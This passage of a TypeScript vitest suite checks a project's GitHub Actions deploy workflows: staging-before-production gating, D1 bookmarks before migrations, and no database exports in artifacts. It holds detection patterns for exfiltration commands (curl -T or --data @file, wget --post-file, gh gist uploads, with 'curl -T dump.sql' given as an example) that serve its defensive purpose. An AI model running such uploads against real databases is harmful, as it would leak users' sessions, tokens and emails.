import { existsSync, readdirSync, readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import yaml from 'js-yaml'
import { describe, expect, it } from 'vitest'
import { D1_TESTS } from '../vitest.config'
import { githubHostedRunner } from './ci-runners'
import { type ReleaseCommand, readOnlyCommands, releaseAuthorizations } from './cloudflare-release'
import { MEDIA_HEALTH_SQL } from './media-health'
import { project } from './project'
import { stagingWorkflow } from './staging-verification'

interface WorkflowStep {
  'continue-on-error'?: boolean | string
  shell?: string
  'working-directory'?: string
  env?: Record<string, string>
  id?: string
  if?: string
  name?: string
  run?: string
  uses?: string
  with?: Record<string, string | number>
}

interface WorkflowJob {
  concurrency?: { 'cancel-in-progress'?: boolean; group?: string }
  defaults?: unknown
  env?: Record<string, string>
  environment?: string | { name: string; url?: string }
  if?: string
  needs?: string | string[]
  permissions?: Record<string, string>
  'runs-on'?: string
  steps?: WorkflowStep[]
}

interface WorkflowInput {
  default?: string
  options?: string[]
  required?: boolean
  type?: string
}

interface WorkflowDefinition {
  concurrency?: { 'cancel-in-progress'?: boolean; group?: string }
  jobs: Record<string, WorkflowJob>
  name?: string
  on: {
    push?: { branches?: string[]; paths?: string[] }
    schedule?: Array<{ cron: string }>
    workflow_dispatch?: { inputs?: Record<string, WorkflowInput> } | null
  } & Record<string, unknown>
  permissions?: Record<string, string>
}

const workflowDirectory = resolve('.github/workflows')
const packageScripts = (
  JSON.parse(readFileSync(resolve('package.json'), 'utf8')) as { scripts: Record<string, string> }
).scripts

function loadWorkflow(file: string): WorkflowDefinition {
  return yaml.load(readFileSync(resolve(workflowDirectory, file), 'utf8')) as WorkflowDefinition
}

function allWorkflows(): Array<[string, WorkflowDefinition]> {
  return readdirSync(workflowDirectory)
    .filter(file => file.endsWith('.yml'))
    .map(file => [file, loadWorkflow(file)])
}

function environmentName(job: WorkflowJob): string | undefined {
  return typeof job.environment === 'string' ? job.environment : job.environment?.name
}

function runs(job: WorkflowJob): string[] {
  return (job.steps ?? []).map(step => step.run).filter((run): run is string => Boolean(run))
}

function stepRunning(job: WorkflowJob, command: string): WorkflowStep {
  const step = job.steps?.find(candidate => candidate.run?.includes(command))
  if (!step) throw new Error(`No step runs ${command}.`)
  return step
}

function stepIndex(job: WorkflowJob, command: string): number {
  return (job.steps ?? []).findIndex(step => step.run?.includes(command))
}

/** Environment names a script reads through its required(...) guards. */
function requiredScriptEnvironment(script: string): string[] {
  const source = readFileSync(resolve(script), 'utf8')
  return [...source.matchAll(/require(?:d|Environment)\(env, '([A-Z_]+)'\)/gu)]
    .map(match => match[1] as string)
    .sort()
}

const expression = (value: string) => `\${{ ${value} }}`
const secret = (name: string) => expression(`secrets.${name}`)
const credentialsGate = "steps.credentials.outputs.configured == 'true'"
const productionDispatchWorkflows = [
  'bootstrap-production-d1.yml',
  'deploy-production.yml',
  'publish-d1.yml'
]
/** Media uploads (#95) guard themselves in scripts/media-upload.ts, not cloudflare-release.ts. */
const mediaUploadWorkflows = {
  'upload-media-staging.yml': 'staging',
  'upload-media.yml': 'production'
} as const
/** The weekly read-only media health check (#122): one D1 SELECT, R2 list, CDN HEADs. */
const mediaHealthWorkflow = 'media-health.yml'
const newWorkflows = [
  ...productionDispatchWorkflows,
  'web.yml',
  mediaHealthWorkflow,
  'publish-d1-staging.yml',
  ...Object.keys(mediaUploadWorkflows)
]

const productionGroup = { group: 'deploy-best-serp-co-production', 'cancel-in-progress': false }

describe('staging deploy job', () => {
  const workflow = loadWorkflow('web.yml')
  const job = workflow.jobs['deploy-staging'] as WorkflowJob
  const tipGate = "steps.tip.outputs.deploy == 'true'"

  it('deploys every staging push (and a dispatch on staging) once the checks pass, one at a time', () => {
    expect(Object.keys(workflow.on).sort()).toEqual(['pull_request', 'push', 'workflow_dispatch'])
    expect(workflow.on.push).toEqual({ branches: ['staging', 'main'] })
    expect(stagingWorkflow.branch).toBe('staging')
    expect(releaseAuthorizations['web.yml']?.branch).toBe('staging')
    expect(workflow.permissions).toEqual({ actions: 'read', contents: 'read' })
    // Job-level: a pull request or a run on another branch is skipped by `if` and never joins
    // the group.
    expect(job.concurrency).toEqual({
      group: 'deploy-best-serp-co-staging',
      'cancel-in-progress': false,
      // Nothing joining the group cancels a waiting deploy or publication.
      queue: 'max'
    })
    expect(Object.keys(workflow.jobs)).toEqual(['changes', 'check', 'e2e', 'tip', 'deploy-staging'])
    expect(job.needs).toEqual(['check', 'e2e', 'tip'])
    // Only the staging tip starts it (the tip job); a partial re-run that reuses an old `tip`
    // output waits in the queue, and the in-job tip guard skips it.
    expect(job.if).toBe(
      "github.ref == 'refs/heads/staging' && github.event_name != 'pull_request' && needs.tip.outputs.deploy == 'true'"
    )
    expect(job.environment).toEqual({ name: 'staging', url: project.remote.staging.origin })
    expect(job.env).toEqual({ STAGING_ORIGIN: project.remote.staging.origin })
    expect(JSON.stringify(job)).not.toMatch(/production/u)
  })

  it('builds, then deploys only the staging tip: bookmark, migrate, deploy, gates, smoke', () => {
    const commands = [
      'pnpm worker:build',
      'pnpm tsx scripts/cloudflare-release.ts bookmark staging',
      'pnpm tsx scripts/cloudflare-release.ts migrate staging',
      'pnpm tsx scripts/cloudflare-release.ts deploy staging',
      'pnpm tsx scripts/d1-preview-http-gates.ts staging "$STAGING_ORIGIN"',
      'pnpm --filter web test:install',
      'pnpm --filter web test:e2e:smoke'
    ]
    const tip = job.steps?.find(step => step.id === 'tip')
    expect(tip?.run).toContain('git ls-remote --exit-code origin refs/heads/staging')
    expect(tip?.run).toContain('if [ "$tip" = "$GITHUB_SHA" ]')
    expect(
      runs(job)
        .filter(run => run !== tip?.run)
        .slice(1)
    ).toEqual(commands)
    // The tip is compared after the build and before anything changes staging.
    const names = (job.steps ?? []).map(step => step.name)
    expect(names.indexOf('Deploy only the staging tip')).toBe(
      names.indexOf('Build OpenNext Worker') + 1
    )
    expect(names.indexOf('Record staging D1 Time Travel bookmark')).toBe(
      names.indexOf('Deploy only the staging tip') + 1
    )
    expect(stepRunning(job, 'test:e2e:smoke').env).toEqual({
      PLAYWRIGHT_BASE_URL: expression('env.STAGING_ORIGIN'),
      PLAYWRIGHT_EXTERNAL_SERVER: '1'
    })
    const evidence = job.steps?.find(step => step.uses === 'actions/upload-artifact@v7')
    expect(evidence?.if).toBe(`always() && ${tipGate}`)
    expect(String(evidence?.with?.path)).toContain('apps/web/playwright-report/')
  })

  it('names the steps production requires as proof that staging verified a commit', () => {
    expect(stagingWorkflow.file).toBe('web.yml')
    const proof: Record<(typeof stagingWorkflow.requiredSteps)[number], string> = {
      'Apply staging D1 migrations': 'pnpm tsx scripts/cloudflare-release.ts migrate staging',
      'Deploy staging Worker': 'pnpm tsx scripts/cloudflare-release.ts deploy staging',
      'Run staging HTTP gates': 'pnpm tsx scripts/d1-preview-http-gates.ts staging',
      'Run Playwright smoke against staging': 'pnpm --filter web test:e2e:smoke'
    }
    expect(Object.keys(proof)).toEqual([...stagingWorkflow.requiredSteps])
    // Only this job may carry those steps: verification looks at every job of a web.yml run.
    for (const [id, other] of Object.entries(workflow.jobs)) {
      if (id === 'deploy-staging') continue
      for (const name of stagingWorkflow.requiredSteps) {
        expect(
          (other as WorkflowJob).steps?.some(step => step.name === name),
          `${id}: ${name}`
        ).toBe(false)
      }
    }
    for (const [name, command] of Object.entries(proof)) {
      const steps = (job.steps ?? []).filter(step => step.name === name)
      expect(steps, name).toHaveLength(1)
      expect(steps[0]?.run, name).toContain(command)
      expect(steps[0]?.if, name).toBe(tipGate)
    }
  })

  it('runs the same staging migration as pnpm db:migrate:staging', () => {
    expect(packageScripts['db:migrate:staging']).toBe(
      stepRunning(job, 'cloudflare-release.ts migrate staging').run
    )
  })

  it('skips cleanly, without failing staging, until Cloudflare credentials exist', () => {
    const [check, ...rest] = job.steps ?? []
    expect(check?.id).toBe('credentials')
    expect(check?.if).toBeUndefined()
    expect(check?.run).toContain('echo "configured=false" >> "$GITHUB_OUTPUT"')
    expect(check?.run).toContain('::notice title=Staging deploy skipped::')
    expect(check?.run).not.toMatch(/exit 1/u)
    // Every later step runs only with credentials; the tip step runs only after them.
    for (const step of rest) {
      expect([credentialsGate, tipGate, `always() && ${tipGate}`], step.name).toContain(step.if)
    }
    expect(job.steps?.find(step => step.id === 'tip')?.if).toBe(credentialsGate)
  })
})

describe('production deploy workflow', () => {
  const workflow = loadWorkflow('deploy-production.yml')
  const authorize = workflow.jobs.authorize as WorkflowJob
  const release = workflow.jobs.release as WorkflowJob
  const databaseStep = "steps.plan.outputs.mode == 'database-and-worker'"

  it('releases every push to main, and typed-confirmation dispatches from main', () => {
    expect(Object.keys(workflow.on).sort()).toEqual(['push', 'workflow_dispatch'])
    expect(workflow.on.push).toEqual({ branches: ['main'] })
    expect(releaseAuthorizations['deploy-production.yml']?.branch).toBe('main')
    const inputs = workflow.on.workflow_dispatch?.inputs ?? {}
    expect(Object.keys(inputs)).toEqual(['confirmation'])
    const check = runs(authorize).join('\n')
    expect(check).toContain('"$GITHUB_REF" != "refs/heads/main"')
    // The typed confirmation applies to dispatches; a push is approved by the environment.
    expect(check).toContain(
      `[ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ] && [ "$CONFIRMATION" != "${project.confirmation.deploy}" ]`
    )
    expect(release.needs).toEqual(['authorize'])
    expect(release.environment).toEqual({ name: 'production', url: project.publicUrl })
    expect(workflow.concurrency).toBeUndefined()
    expect(release.concurrency).toEqual(productionGroup)
  })

  it('replaces the staging check only for a hotfix dispatch, with proof of a hotfix-* merge', () => {
    const [ref, ...rest] = authorize.steps ?? []
    expect(ref?.id).toBe('ref')
    expect(ref?.run).toContain(
      `[ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ] && [ "$CONFIRMATION" = "${project.confirmation.hotfix}" ]`
    )
    expect(ref?.run?.match(/proof=hotfix/gu)).toHaveLength(1)
    expect(ref?.run).toContain('echo "proof=staging" >> "$GITHUB_OUTPUT"')
    // Exactly one proof runs: staging verification, or the merged hotfix-* pull request.
    expect(rest.map(step => [step.if, step.run ?? step.uses])).toEqual([
      [undefined, 'actions/checkout@v7'],
      [undefined, './.github/actions/install'],
      ["steps.ref.outputs.proof == 'staging'", 'pnpm tsx scripts/staging-verification.ts'],
      ["steps.ref.outputs.proof == 'hotfix'", 'pnpm tsx scripts/staging-verification.ts --hotfix']
    ])
    expect(workflow.permissions).toEqual({
      actions: 'read',
      contents: 'read',
      'pull-requests': 'read'
    })
    expect(releaseAuthorizations['deploy-production.yml']?.hotfixConfirmation).toBe(
      project.confirmation.hotfix
    )
    // The plan sees the confirmation and a token, so a hotfix with pending migrations and a
    // stale release both stop before the bookmark.
    expect(stepRunning(release, 'plan-release production').env).toMatchObject({
      GITHUB_TOKEN: expression('github.token'),
      RELEASE_CONFIRM: expression('inputs.confirmation')
    })
  })

  it('runs the same production migration as pnpm db:migrate:production', () => {
    expect(packageScripts['db:migrate:production']).toBe(
      stepRunning(release, 'cloudflare-release.ts migrate production').run
    )
  })

  it('plans from the ledger, bookmarks and migrates only when migrations are pending', () => {
    const order = [
      'pnpm harness:fast',
      'pnpm worker:build',
      'cloudflare-release.ts plan-release production',
      'cloudflare-release.ts bookmark production',
      'cloudflare-release.ts migrate production',
      'cloudflare-release.ts deploy production',
      'd1-preview-http-gates.ts production https://best.serp.co'
    ].map(command => stepIndex(release, command))
    expect(order.every(index => index >= 0)).toBe(true)
    expect([...order].sort((left, right) => left - right)).toEqual(order)

    const plan = stepRunning(release, 'plan-release production')
    expect(plan.id).toBe('plan')
    expect(plan.if).toBeUndefined()
    expect(plan.run).toContain('echo "mode=$mode" >> "$GITHUB_OUTPUT"')
    expect(plan.run).toContain('database-and-worker | worker-only) ;;')
    expect(stepRunning(release, 'bookmark production').if).toBe(databaseStep)
    expect(stepRunning(release, 'migrate production').if).toBe(databaseStep)
    expect(stepRunning(release, 'deploy production').if).toBeUndefined()
    expect(stepIndex(release, 'migrate production')).toBe(
      stepIndex(release, 'bookmark production') + 1
    )
    expect(release.steps?.filter(step => step.uses?.includes('upload-artifact'))).toEqual([])
  })

  it('gates best.serp.co once the Worker serves it, and the workers.dev review origin before', () => {
    const gates = stepRunning(release, 'd1-preview-http-gates.ts')
    expect(gates.run).toContain('if [ "$server" = "GitHub.com" ]; then')
    expect(gates.run).toContain('d1-preview-http-gates.ts staging "$PRODUCTION_REVIEW_ORIGIN"')
    expect(gates.env?.PRODUCTION_REVIEW_ORIGIN).toBe(
      'https://best-serp-co-production.serpcompany.workers.dev'
    )
  })
})

describe('production D1 bootstrap workflow', () => {
  const workflow = loadWorkflow('bootstrap-production-d1.yml')
  const bootstrap = workflow.jobs.bootstrap as WorkflowJob

  it('imports into empty production D1 and verifies it against the parity report', () => {
    expect(Object.keys(workflow.on)).toEqual(['workflow_dispatch'])
    expect(Object.keys(workflow.on.workflow_dispatch?.inputs ?? {})).toEqual(['confirmation'])
    expect(runs(workflow.jobs.authorize as WorkflowJob).join('\n')).toContain(
      `"$CONFIRMATION" != "${project.confirmation.bootstrap}"`
    )
    expect(environmentName(bootstrap)).toBe('production')
    expect(runs(bootstrap).slice(1)).toEqual([
      'pnpm test:d1',
      'pnpm tsx scripts/cloudflare-release.ts bookmark production',
      'pnpm tsx scripts/cloudflare-release.ts import production',
      'pnpm tsx scripts/cloudflare-release.ts verify-import production'
    ])
    expect(JSON.stringify(workflow)).not.toMatch(/deploy production|opennextjs-cloudflare/u)
  })
})

describe('staging before production in the workflows', () => {
  const gated = Object.entries(releaseAuthorizations).filter(
    ([, authorization]) => authorization.requireVerifiedStaging.length > 0
  )

  it('gates the production deploy and the bootstrap, which both apply migrations', () => {
    expect(gated.map(([file]) => file)).toEqual([
      'deploy-production.yml',
      'bootstrap-production-d1.yml'
    ])
  })

  it('verifies staging before reviewer approval and again in every gated release step', () => {
    for (const [file, authorization] of gated) {
      const workflow = loadWorkflow(file)
      // The hotfix check also reads merged pull requests.
      expect(workflow.permissions, file).toEqual(
        authorization.hotfixConfirmation
          ? { actions: 'read', contents: 'read', 'pull-requests': 'read' }
          : { actions: 'read', contents: 'read' }
      )
      const authorize = workflow.jobs.authorize as WorkflowJob
      expect(authorize.environment, file).toBeUndefined()
      const verify = stepRunning(authorize, 'pnpm tsx scripts/staging-verification.ts')
      expect(verify.run, file).toBe('pnpm tsx scripts/staging-verification.ts')
      expect(verify.env, file).toEqual({ GITHUB_TOKEN: expression('github.token') })
      expect(stepIndex(authorize, 'staging-verification.ts'), file).toBeGreaterThan(
        stepIndex(authorize, '"$CONFIRMATION"')
      )
      // cloudflare-release.ts repeats the check, so each gated step needs the token too.
      const gatedSteps = Object.values(workflow.jobs)
        .flatMap(job => job.steps ?? [])
        .filter(step => {
          const command = step.run?.match(/cloudflare-release\.ts ([a-z-]+) production/u)?.[1]
          return authorization.requireVerifiedStaging.some(gatedCommand => gatedCommand === command)
        })
      expect(gatedSteps.length, file).toBe(authorization.requireVerifiedStaging.length)
      for (const step of gatedSteps) {
        expect(step.env?.GITHUB_TOKEN, `${file}: ${step.name}`).toBe(expression('github.token'))
      }
    }
  })
})

describe('version-pinned HTTP gates', () => {
  it('hands the version Wrangler deployed to the gates in both deploy workflows', () => {
    // Outside the checkout (runner.temp), because the release script refuses an unclean tree.
    const wranglerOutput = `${expression('runner.temp')}/wrangler-output.ndjson`
    const cases: Array<[string, string, string]> = [
      ['web.yml', 'deploy-staging', 'staging'],
      ['deploy-production.yml', 'release', 'production']
    ]
    for (const [file, jobName, environment] of cases) {
      const job = loadWorkflow(file).jobs[jobName] as WorkflowJob
      const deploy = stepRunning(job, `cloudflare-release.ts deploy ${environment}`)
      const gates = stepRunning(job, 'd1-preview-http-gates.ts')
      expect(deploy.env?.WRANGLER_OUTPUT_FILE_PATH, file).toBe(wranglerOutput)
      expect(gates.env?.WRANGLER_OUTPUT_FILE_PATH, file).toBe(wranglerOutput)
      expect(
        (job.steps ?? [])
          .filter(step => step.env?.WRANGLER_OUTPUT_FILE_PATH !== undefined)
          .map(step => step.name),
        file
      ).toEqual([deploy.name, gates.name])
      expect(stepIndex(job, 'd1-preview-http-gates.ts'), file).toBeGreaterThan(
        stepIndex(job, `cloudflare-release.ts deploy ${environment}`)
      )
    }
  })
})

describe('recreated D1 operation workflows', () => {
  it('names the exact workflow files the script guards require', () => {
    const guards: Array<[string, string]> = [
      ['scripts/d1-remote-publisher.ts', 'publish-d1.yml'],
      ['scripts/d1-remote-publisher.ts', 'publish-d1-staging.yml'],
      ['scripts/media-upload.ts', 'upload-media.yml'],
      ['scripts/media-upload.ts', 'upload-media-staging.yml']
    ]
    for (const [script, workflow] of guards) {
      expect(readFileSync(resolve(script), 'utf8')).toContain(`/.github/workflows/${workflow}@`)
      expect(existsSync(resolve(workflowDirectory, workflow)), workflow).toBe(true)
    }
    for (const workflow of Object.keys(releaseAuthorizations)) {
      expect(existsSync(resolve(workflowDirectory, workflow)), workflow).toBe(true)
    }
  })

  it('satisfies each script environment contract against production D1 only', () => {
    const contracts: Array<[string, string, string, string]> = [
      ['publish-d1.yml', 'publish', 'pnpm db:publish:production', 'scripts/d1-remote-publisher.ts']
    ]
    for (const [file, jobName, command, script] of contracts) {
      const step = stepRunning(loadWorkflow(file).jobs[jobName] as WorkflowJob, command)
      const provided = Object.keys(step.env ?? {})
      expect(requiredScriptEnvironment(script).length).toBeGreaterThan(0)
      for (const name of requiredScriptEnvironment(script)) {
        expect(provided, `${file} ${name}`).toContain(name)
      }
      expect(step.env?.CLOUDFLARE_D1_DATABASE_ID).toBe(project.remote.production.databaseId)
      expect(step.env?.CLOUDFLARE_API_TOKEN).toBe(secret('CLOUDFLARE_API_TOKEN'))
      expect(step.env?.CLOUDFLARE_ACCOUNT_ID).toBe(secret('CLOUDFLARE_ACCOUNT_ID'))
    }
    const publish = loadWorkflow('publish-d1.yml').jobs.publish as WorkflowJob
    expect(stepRunning(publish, 'db:publish:production').env?.D1_PUBLICATION_CONFIRM).toBe(
      expression('inputs.confirmation')
    )
    expect(stepRunning(publish, 'db:publish:production').run).toBe(
      'pnpm db:publish:production -- "$MANIFEST_PATH"'
    )
  })

  it('requires the script confirmation and bookmarks D1 before publication', () => {
    const cases: Array<[string, string, string, string]> = [
      ['publish-d1.yml', 'publish', project.confirmation.publish, 'db:publish:production']
    ]
    for (const [file, jobName, confirmation, command] of cases) {
      const workflow = loadWorkflow(file)
      const job = workflow.jobs[jobName] as WorkflowJob
      expect(Object.keys(workflow.on)).toEqual(['workflow_dispatch'])
      expect(runs(workflow.jobs.authorize as WorkflowJob).join('\n')).toContain(
        `"$CONFIRMATION" != "${confirmation}"`
      )
      const bookmark = stepIndex(job, 'cloudflare-release.ts bookmark production')
      expect(bookmark).toBeGreaterThan(stepIndex(job, 'pnpm test:d1'))
      expect(stepIndex(job, command)).toBe(bookmark + 1)
      expect(job.steps?.filter(step => step.uses?.includes('upload-artifact'))).toEqual([])
    }
    const publishAuthorize = runs(loadWorkflow('publish-d1.yml').jobs.authorize as WorkflowJob)
    expect(publishAuthorize.join('\n')).toContain('^d1/publications/[A-Za-z0-9._-]+\\.ya?ml$')
  })
})

describe('D1 data stays in Cloudflare', () => {
  // This repository is public: any signed-in GitHub user can download a workflow artifact, and
  // fork pull requests can restore caches. A D1 export holds sessions, OAuth tokens, and emails,
  // so no workflow exports D1; recovery is a Time Travel bookmark (#99, docs/D1_RECOVERY.md).
  // These checks read workflow and script text, not data; RELEASE_GUARDS lists what they miss.
  //
  // Adding a job that gets CLOUDFLARE_API_TOKEN (RELEASE_GUARDS, "Adding a credentialed job"):
  // 1. add `<file>:<job>` to `credentialedJobs`;
  // 2. put `cloudflare-release.ts bookmark <env>` right before each step that can change D1 and
  //    add `<file>:<job>:<env>` to `bookmarkedChanges` (once per change step);
  // 3. only for a token step that cannot change D1 (an R2-only upload, say), add its exact `run`
  //    to `tokenStepsWithoutChanges`, with a comment saying why;
  // 4. add any new action to `credentialedJobActions`, and any artifact or cache to
  //    `allowedUploads`.

  /** Every job where some step gets the Cloudflare token: the upload checks cover each one. */
  const credentialedJobs = [
    'bootstrap-production-d1.yml:bootstrap',
    'deploy-production.yml:release',
    'web.yml:deploy-staging',
    'media-health.yml:check',
    'publish-d1-staging.yml:publish',
    'publish-d1.yml:publish',
    'upload-media-staging.yml:upload',
    'upload-media.yml:upload'
  ]
  /** Every step that can change D1, as `<file>:<job>:<environment>`; each follows a bookmark. */
  const bookmarkedChanges = [
    'bootstrap-production-d1.yml:bootstrap:production',
    'deploy-production.yml:release:production',
    'web.yml:deploy-staging:staging',
    'publish-d1-staging.yml:publish:staging',
    'publish-d1.yml:publish:production'
  ]
  const databaseExport =
    /backup|dump|export|snapshot|\.sql\b|\.sqlite|\.db\b|(?:^|[^a-z0-9])d1(?:[^a-z0-9]|$)|database/iu
  const uploads = /upload-artifact|actions\/cache|upload-pages-artifact/u
  /**
   * Every artifact and cache a workflow or composite action saves today, by action, name, and
   * path. Add one only after review: none may ever hold database content.
   */
  const allowedUploads: Array<{ action: RegExp; name: RegExp; paths: string[] }> = [
    {
      action: /^actions\/upload-artifact@/u,
      name: /^playwright-report$/u,
      paths: ['apps/web/playwright-report/']
    },
    {
      // An E2E receipt (web.yml): the tested tree's hash, nothing else.
      action: /^actions\/upload-artifact@/u,
      name: /^passed-e2e-\$\{\{ steps\.receipt\.outputs\.tree \}\}$/u,
      paths: [`${expression('runner.temp')}/receipt.txt`]
    },
    {
      action: /^actions\/upload-artifact@/u,
      name: /^staging-smoke-\$\{\{ github\.sha \}\}-\$\{\{ github\.run_attempt \}\}$/u,
      paths: ['apps/web/playwright-report/', 'apps/web/test-results/']
    },
    {
      // The install action's dependency and Next.js build caches.
      action: /^actions\/cache@/u,
      name: /^$/u,
      paths: [
        '~/.pnpm',
        `${expression('github.workspace')}/.next/cache`,
        `${expression('github.workspace')}/apps/*/.next/cache`
      ]
    }
  ]
  /** Actions a job holding the Cloudflare token may use. */
  const credentialedJobActions = new Set([
    'actions/checkout@v7',
    './.github/actions/install',
    'actions/github-script@v9',
    'actions/upload-artifact@v7'
  ])
  const bookmarkCommand = (environment: string) =>
    `pnpm tsx scripts/cloudflare-release.ts bookmark ${environment}`
  const escapeRegExp = (value: string) => value.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')
  /**
   * The only steps holding the Cloudflare token that are not D1 changes, matched on their whole
   * `run`. Everything else that holds the token is a change and needs a bookmark (fail closed):
   * an unknown launcher, a path-invoked script, or an action all count.
   */
  const message = '[^"$`\\\\\\n]*'
  const tokenStepsWithoutChanges: Array<{ id: string; run: RegExp }> = [
    {
      id: 'credential check (fail)',
      run: new RegExp(
        `^if \\[ -z "\\$CLOUDFLARE_API_TOKEN" \\] \\|\\| \\[ -z "\\$CLOUDFLARE_ACCOUNT_ID" \\]; then\\n  echo "::error::${message}"\\n  exit 1\\nfi\\n?$`,
        'u'
      )
    },
    {
      id: 'credential check (skip)',
      run: new RegExp(
        `^if \\[ -n "\\$CLOUDFLARE_API_TOKEN" \\] && \\[ -n "\\$CLOUDFLARE_ACCOUNT_ID" \\]; then\\n  echo "configured=true" >> "\\$GITHUB_OUTPUT"\\n  exit 0\\nfi\\necho "configured=false" >> "\\$GITHUB_OUTPUT"\\nmessage="${message}"\\necho "::(?:notice|warning) title=${message}::\\$message"\\necho "\\$message" >> "\\$GITHUB_STEP_SUMMARY"\\n?$`,
        'u'
      )
    },
    {
      id: 'read-only release command',
      run: /^pnpm tsx scripts\/cloudflare-release\.ts (?:bookmark|plan-release|list-migrations|check-database|verify-import|deploy) (?:staging|production)\n?$/u
    },
    {
      // The listing media uploads (#95): `scripts/media-upload.ts` reads and writes R2 objects
      // through the R2 API (`scripts/r2-objects.ts`) and never reaches D1, so this exact command
      // is not a D1 change. Any other spelling still needs a bookmark (fail closed).
      id: 'R2-only media upload',
      run: /^pnpm media:upload:(?:staging|production) -- "\$PLAN_PATH"\n?$/u
    },
    {
      // The weekly media health check (#122): `scripts/media-health.ts` runs one SELECT through
      // the release tooling's Wrangler D1 target (`query`, never `executeFile` or migrations),
      // lists the bucket through the R2 API, and HEADs the media host. It writes nothing; the
      // issue is filed by the next step, which holds no Cloudflare credential. Any other
      // spelling still needs a bookmark (fail closed).
      id: 'read-only media health check',
      run: /^pnpm media:health -- production --report "\$RUNNER_TEMP\/media-health\.json"\n?$/u
    },
    {
      id: 'Deploy Production plan',
      run: new RegExp(
        `^${escapeRegExp(
          [
            'plan="$(pnpm tsx scripts/cloudflare-release.ts plan-release production)"',
            'echo "$plan"',
            'mode="$(jq -r .mode <<<"$plan")"',
            'case "$mode" in',
            '  database-and-worker | worker-only) ;;',
            '  *)',
            '    echo "::error::plan-release returned no release mode."',
            '    exit 1',
            '    ;;',
            'esac',
            'echo "mode=$mode" >> "$GITHUB_OUTPUT"',
            `echo "Release mode: $mode (pending migrations: $(jq -r '.pendingMigrations | join(", ")' <<<"$plan"))" >> "$GITHUB_STEP_SUMMARY"`
          ].join('\n')
        )}\\n?$`,
        'u'
      )
    }
  ]
  /**
   * What an exempt step may carry besides its `run`: anything else (an `env` such as
   * `NODE_OPTIONS` or `BASH_ENV`, a `shell`, a `working-directory`, or `defaults.run` on the job
   * or workflow) can make a reviewed command do something else, so the step is not exempt.
   */
  const exemptStepKeys = new Set(['env', 'id', 'if', 'name', 'run'])
  const exemptEnvironment: Readonly<Record<string, string>> = {
    CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
    CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN'),
    GITHUB_TOKEN: expression('github.token'),
    // The media uploads' typed confirmation and reviewed plan path (#95), checked by the script.
    MEDIA_UPLOAD_CONFIRM: expression('inputs.confirmation'),
    PLAN_PATH: expression('inputs.plan_path'),
    RELEASE_CONFIRM: expression('inputs.confirmation'),
    // Deploy Staging's job env, and where the Worker deploy records its version.
    STAGING_ORIGIN: project.remote.staging.origin,
    WRANGLER_OUTPUT_FILE_PATH: `${expression('runner.temp')}/wrangler-output.ndjson`
  }
  const onlyExemptEnvironment = (env: unknown) =>
    env === undefined ||
    (typeof env === 'object' &&
      env !== null &&
      Object.entries(env).every(([key, value]) => exemptEnvironment[key] === value))
  const tokenStepWithoutChanges = (
    workflow: WorkflowDefinition,
    job: WorkflowJob,
    step: WorkflowStep
  ) =>
    Object.keys(step).every(key => exemptStepKeys.has(key)) &&
    onlyExemptEnvironment(step.env) &&
    onlyExemptEnvironment(job.env) &&
    onlyExemptEnvironment((workflow as { env?: unknown }).env) &&
    job.defaults === undefined &&
    (workflow as { defaults?: unknown }).defaults === undefined &&
    tokenStepsWithoutChanges.find(known => known.run.test(step.run ?? ''))?.id
  /** Files that hand values to later steps: a token step outside the list may not write them. */
  const workflowCommandFiles = /\bGITHUB_(?:ENV|PATH|OUTPUT|STATE)\b/u
  /**
   * Network uploads, read per shell command (split at `|`, `;`, `&`, newlines, and `)`), so
   * `curl -sSI … | awk -F': '` is not an upload but `curl -T dump.sql …` is.
   */
  function outboundUploads(run: string): string[] {
    return run
      .split(/[|;&\n)]/u)
      .map(command => command.trim())
      .filter(command => {
        const words = command.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/gu) ?? []
        const at = words.findIndex(word => /(?:^|\/)(?:curl|wget|gh)$/u.test(word))
        if (at === -1) return false
        const program = words[at]?.split('/').at(-1)
        const args = words.slice(at + 1)
        if (program === 'gh')
          return (
            args[0] === 'gist' ||
            (args[0] === 'release' && (args[1] === 'upload' || args[1] === 'create')) ||
            (args[0] === 'api' &&
              args.some(arg => /^(?:--input|-[fF]|--(?:raw-)?field)$/u.test(arg)))
          )
        if (program === 'wget')
          return args.some(arg =>
            /^--(?:post|body)-(?:file|data)\b|^--method=(?:POST|PUT|PATCH)$/iu.test(arg)
          )
        return args.some(
          (arg, index) =>
            /^-[a-zA-Z]*[TF]$|^-[TF].+|^--(?:upload-file|form|form-string)(?:=|$)/u.test(arg) ||
            /^-d@|^--data(?:-binary|-raw|-urlencode)?=@/u.test(arg) ||
            (/^(?:-d|--data(?:-binary|-raw|-urlencode)?)$/u.test(arg) &&
              /^['"]?@/u.test(args[index + 1] ?? ''))
        )
      })
  }
  /** A status function replaces `if`'s implicit `success()`, so a failed bookmark stops nothing. */
  const statusFunction = /\b(?:always|failure|cancelled|success)\s*\(/u

  const stepsOf = (job: WorkflowJob) => job.steps ?? []

  /** Every step of every workflow and composite action under .github, wherever it is nested. */
  function githubSteps(): Array<[string, WorkflowStep]> {
    const files = [
      ...readdirSync(workflowDirectory)
        .filter(file => /\.ya?ml$/u.test(file))
        .map(file => `.github/workflows/${file}`),
      ...readdirSync(resolve('.github/actions'), { recursive: true, encoding: 'utf8' })
        .filter(file => /(?:^|\/)action\.ya?ml$/u.test(file))
        .map(file => `.github/actions/${file}`)
    ]
    const steps: Array<[string, WorkflowStep]> = []
    const visit = (file: string, node: unknown): void => {
      if (Array.isArray(node)) for (const item of node) visit(file, item)
      else if (typeof node === 'object' && node !== null) {
        if ('uses' in node || 'run' in node) steps.push([file, node as WorkflowStep])
        for (const value of Object.values(node)) visit(file, value)
      }
    }
    for (const file of files) visit(file, yaml.load(readFileSync(resolve(file), 'utf8')))
    return steps
  }

  function uploadViolations(step: WorkflowStep): string[] {
    if (!step.uses || !uploads.test(step.uses)) return []
    const values = [step.with?.name, step.with?.path, step.with?.key].map(value =>
      String(value ?? '')
    )
    const problems = values.filter(value => databaseExport.test(value))
    const paths = String(step.with?.path ?? '')
      .split('\n')
      .map(path => path.trim())
      .filter(Boolean)
    const allowed = allowedUploads.some(
      upload =>
        upload.action.test(step.uses ?? '') &&
        upload.name.test(String(step.with?.name ?? '')) &&
        paths.length > 0 &&
        paths.every(path => upload.paths.includes(path))
